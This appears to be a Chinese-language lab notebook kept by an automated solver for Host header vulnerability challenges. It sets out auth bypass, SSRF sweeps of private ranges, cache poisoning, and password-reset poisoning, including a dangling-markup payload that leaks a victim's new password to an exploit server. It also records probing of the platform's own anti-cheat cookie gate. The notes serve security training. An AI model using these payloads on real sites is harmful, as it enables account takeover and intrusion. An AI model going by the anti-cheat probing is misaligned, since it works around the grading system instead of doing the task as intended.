---
title: Host 头族:鉴权、路由与缓存
---

# Host 头族:鉴权、路由与缓存

同一类型漏洞:服务端对「请求意图宿主」的解析面被滥用。共性成因是多层
(缓存/负载均衡/后端)各自从 Host 头、请求行 absolute URL、X-Forwarded-* 中
取宿主,取值不一致即产生越权、SSRF 或缓存投毒。

## 子型判型矩阵

| 子型 | 判型特征 | 手法方向 | 实录 |
|---|---|---|---|
| Host 鉴权 | `/admin` 按 Host 判权 | 覆盖 `Host: localhost` 直达管理面 | HH-1 |
| Host 路由 SSRF | 前端以 Host 为上游地址 | 遍历 Host 私网段找内网 admin | HH-2 |
| 请求解析不一致 | 普通 Host 覆盖被 403 拒 | 路由取 **Host 头首个 `:` 前段**;请求行只被校验、不参与路由;平台对本题禁 `_lab` 后 Host 面被实例名 allowlist 锁死(未收口) | [[lab-host-header-ssrf-via-flawed-request-parsing]] |
| 歧义请求缓存投毒 | 页面内嵌 `//<Host>/...` 资源 | 缓存键与后端处理错位;绝对形/请求行 authority 面批 46 已解(abs_sweep+_lab 钥匙) | HH-4 解 |
| 密码重置投毒(basic) | 重置邮件链接用 Host 拼绝对 URL | `Host: <exploit>` 发重置 → 读 exploit `/log` 拿 token | [[lab-host-header-basic-password-reset-poisoning]] |
| 密码重置投毒(dangling markup) | 邮件链接仅 `https://<HOST>/login`,**新密码是邮件正文纯文本** | Host 加**端口**绕过前端按主机名的路由 → 端口后拼 `'><img/src="https://exploit/?`(双引号悬垂吞掉密码) | [[lab-host-header-password-reset-poisoning-via-dangling-markup]] |

## 共性

1. 先定「谁路由、谁校验、缓存键是什么」三问,再构造差异;三者取值来源(头/请求行/转发头)是分型关键。
2. 反映点常是页面里以宿主体拼接的绝对 URL(`//<Host>/resources/js/...`),即可投毒面。
3. 私网可达性:前端按 Host 转发即 SSRF;不可达私网返回 `504 connecting to <ip>` 可当探针。

## 判定与收尾要点

- 判定锚点:实际抵达管理面并删 `carlos`,或首页在受害者上下文执行 `alert(document.cookie)`;仅 Host 被接受不算解。
- Host 遍历用件(非手敲):区间模板 `192.168.0.FUZZ`,命中即 `200/302` 的独特体。
- 请求行/重复头等 ureq 表达不了的畸形请求,用 raw 件发字节级请求并读全响应头。
- 收束:`solved_check` 读实例横幅。

## 重置投毒组

- 面:`/forgot-password`(csrf+username)发出重置邮件,**邮件里的绝对链接由 Host 拼成**。
- 手法:**TLS 上直接覆盖 Host 就够**(`lab_http --header 'Host: <exploit-server>'`,SNI 仍按 URL 主机;
  本次未遇「平台 TLS 墙」):POST 重置请求时 host 指向自己的 exploit server → 邮件链接变成
  `https://<exploit>/forgot-password?temp-forgot-password-token=…`。
- 取 token:受害者点击后进 exploit server 的 **`/log`**(victim UA + 404 也记);
  这就是「无 OOB 时用 exploit server 自身当接收面」的典型。
- 收口:拿 token 打真站 `GET <lab>/forgot-password?temp-forgot-password-token=<token>` → 重置表单
  (`csrf`+token+`new-password-1/2`)→ POST → 用新密码登录受害者 → `solved_check`。

## dangling 变体

- **前端按 Host 精确路由**是这一族的新陷阱:`Host: <exploit>` / 大写主机名 / 主机名后直接拼 payload 都 504
  (`Gateway Timeout (N) connecting to <Host>`),应用根本没跑到,邮箱也不会产生新邮件。
- 绕过:**`Host: <真主机名>:<任意端口>` + payload** —— 前端只匹配主机名,应用把整个 Host 拼进邮件。
- 悬垂成立的关键:邮件模板里**双引号只出现一次**(我们的注入),于是 `src="https://exploit/?` 一路吞到正文末尾,
  把「新密码」带进回调 URL。受害者侧邮件客户端渲染 HTML 时自动加载该 img(IP `10.0.4.7`)。
- `X-Forwarded-Host` / `X-Forwarded-Server` / `Forwarded: host=` 在该应用**不反映**。

## 已排除面(HH-3/HH-4 实测)

- 前端**同时**校验 Host 头与请求行宿主;私网 token(点分、带端口、十进制、userinfo)一律 403。
- 重复 Host 头被拒(400 `Duplicate header names are not allowed` / 421 `Misdirected Request`)。
- `X-Forwarded-Host` 无反映(响应逐字节相同)。
- 端口 80 明文被拒(`This lab is not accessible over HTTP`),仅 TLS。

## 实例级 `_lab` 禁令与边缘双层(HH-3 现行实测)

平台给该 lab 加了反作弊:客户端**自供 `_lab` cookie → `400 Client Error: Too Nosy`**(170B,文案「Tampering with the _lab cookie is not required to solve this challenge.」);只发 `session` 或不发 cookie 均 200。
⇒ 家族旧法(`Host: <内网 IP>` + 爬边缘的 `_lab`)在现行实例上直接失效,这是长臂全 4xx 的根因。

边缘现行两条硬规则(用 Set-Cookie 归因):

| 层 | 规则 | 失败形态 |
|---|---|---|
| 预检 1 | `Host` 头 host 段(首个 `:` 前)**必须等于实例主机名**;公开域名(example.com、Collaborator 域名)与私网等价形一律同拒 | 403 109B `Client Error: Forbidden`,**无** Set-Cookie |
| 预检 2 | 请求行 absolute-form 的 authority:name 形**必须等于实例主机名**;未识别形(百分号编码、`0300.0250.0.0252`、`[::ffff:…]`)放行 | 403 109B 同上,**带** `_lab`(且无 `session`) |

路由归属判据=上游响应体:**靶场前端只用 Host 头 host 段路由**。请求行写内网 IP、十进制/十六进制/短形/尾点、协议相对 `//`、`http:/`、Collaborator 域名,一律回电商 app(404 `"Not Found"` 11B 或首页 10691B),全程无 504、无内网面板;`Host: <实例名>:80@<内网 IP>` 能过预检 1,但前端取首个 `:` 前段 ⇒ 同样回电商 app(以不可路由 IP `10.0.0.1` 做对照证实)。

⇒ 现行实例可达面盘点:HOST 段被实例名 allowlist 锁死、请求行不参与路由、无转发头 fallback(`X-Forwarded-Host`/`Forwarded`/`X-Forwarded-Server` 均不生效)、重复 Host(含大小写/`Host ␣` 变体)400、h2 的 `Host` 覆盖 `:authority` 与双 `:authority` 均 `GOAWAY`、连接复用第二帧无响应(每响应后关连接)。旧实录的 `_lab` 配方只适用于反作弊上线前的实例。

## 前端指纹(两条 lab 共用)

- **校验**≈`Host.split(':')[0] == <本实例主机名>`:端口段自由(`Host: <lab>:abc` 仍到 app);`@` 出现在冒号前 → 403
  `Client Error: Forbidden`(109B,**无** Set-Cookie)。
- **站点表按最右标签**:`<lab>.exploit-<id>.exploit-server.net` → 直达 exploit server;`<lab>.`、`<lab>-x` 这类未知名 → 421 `Invalid host`(12B)。
- **两阶段 403 可分**:预检失败**不带** `_lab`;过了 Host 预检、死在请求行/路由层仍带 `_lab`(用 Set-Cookie 归因,别只看状态码)。
- 重复头名 → 400 `{"error":"Duplicate header names are not allowed"}`;头值内裸 LF/CR → 400 `Newlines in headers are not allowed` / `Protocol error`;版本前多空格 → 400 `Protocol error`。
- 前端**每响应后关连接**(同一裸连接第二帧多半无响应)。
- 绝对型请求行可用(`raw_http --request-line 'GET http://<host>/ HTTP/1.1'`);但裸 authority(`GET 192.168.0.1:80`)、
  `http:/ip`、`http:ip/`(无斜杠 scheme)会被当**路径**交给 app。
- HH-3:请求行 authority 用 **python-urllib 语义**(userinfo 在**最后一个** `@` 切,`\` 不是终止符:`http://192.168.0.1\@<lab>/` → 200);
  但**路由仍取同一段解析值**,私网目标与 DNS 等价形(`<lab>.`)一律 403 且体逐字节相同 ⇒ 仍无校验/路由缺口。
- HH-4 缓存:**键 = Host 头 hostname(端口被剥)+ path,且站点级**(在 Host 路由之后)。请求行写别的 host 无效
  (实测 `GET http://<exploit>/kc2` + `Host: <lab>` 由靶场 app 应答,随后 `GET /kc2` → `X-Cache: hit, Age: 5`);
  被路由到 exploit server 的响应**不进**靶场缓存(即使带 `max-age=600`)。
- app 侧(该电商 app):Host 校验是 **`hostname[:纯数字 0..65535]` 且末端锢定**,`:abc`/`:`/`:80x`/`:80.`/`:99999` 全 500 错误页文案 `No host found`,且**无**转发头 fallback;
  `/resources/js/*` 与页面都带 `Cache-Control: max-age=30`(可缓存),但**无** `X-Cache-Key` 回显。
- 边缘层在 app 之前就把畸形形状规范化掉:重复 Host(含大小写变体/HTTP/1.0/裸 LF/CR)→ 400,obs-fold(缩进 Host)→ 缩进行被丢,
  `Host ` / `Host\t`(冒号前空白)能过重复检查但 app 直接忽略 ⇒ 想用“两个不同 Host”造语法分歧,得先确认边缘不先规范化。
- h2:边缘支持 h2、按 `:authority` 路由;**大写 `Host` 可覆盖 `:authority` 参与路由**;`host` 与 `:authority` 不一致 → `RST_STREAM`;
  某些 lab 的 `:authority: <lab>` 会 400 `Invalid request`(该题在 h2 下不可达);HH-3 现行实例上 `Host` 覆盖 `:authority`、大写 `Host`、双 `:authority` 三种形均回 `GOAWAY`(17B),h2 面无口。

## 工具面

- `header_scan`:单个请求头按 FUZZ 区间/清单遍历,回命中与长度簇(找内网 admin IP)。
- `raw_http`:字节级 HTTP/1.1(自定义请求行 absolute-form/畸形 Host、重复头、FUZZ 遍历、TLS、输出响应头)。
- `lab_page`(剥题解侦察)、`lab_http`、`lab_launch`、`solved_check`。
- 现行件:`raw_matrix`(多变体一发一独立连接,回状态/字节/digest/Set-Cookie 名,用于层界归因)、`conn_reuse`(字节级连发 + 全响应头)、`h2_req`(h2 原帧与伪头控制)、`burp_collab`(出网腿)。

## 实录溯源

- [[lab-host-header-authentication-bypass]]、[[lab-host-header-routing-based-ssrf]]、[[lab-host-header-ssrf-via-flawed-request-parsing]](旧 `_lab` 法,现行实例被反作弊禁用)、[[lab-host-header-web-cache-poisoning-via-ambiguous-requests]](挂)、[[lab-host-header-basic-password-reset-poisoning]]

## 相关族

- 歧义请求缓存投毒见 [[cache-poisoning-family]];Host 代取内网见 [[ssrf-family]]。
- 方法论:web-vuln-methods(seed 层,按名引用)。

## Links

- evidences: [[academy-edge-lab-cookie-gate]]

## 路由与缓存消费者(grok 先例线)

- 路由型 SSRF 第一步是先证「这个 Host 真被拿去连」(OOB 回调),再扫 `192.168.0.0/24`;顺序反了会把「拒绝」误判成「不通」。
- 缓存键分叉的第二 Host 消费者:重复 Host 的第二个值被写进脚本绝对 URL 时,第一个 Host 仍是缓存键——证据是 `X-Cache` miss 变 hit 且受害者键上出现攻击者脚本源;绝对形式请求行是另一种同构分叉。
- 连接态绕过(首条合法后连接放行毒 Host):关键变量是**边缘墙要求的 lab 会话 cookie**(带上后,同 TCP 连接先合法 Host 紧接毒 Host 即放行;实测破此前「rustls 指纹不过边缘」的悲观判);Burp 形是单连接顺序发组。

## 族地板带

- host 族四数据点:19(auth-bypass 冒烟)/71(connection-state 实解 not-smoke)/34(routing-ssrf 深水)/47(flawed-parsing 深水,平台反作弊硬阻断);解面 19-71 跨冒烟与四台环,深水面挂死属 runner/环境口径非族带。
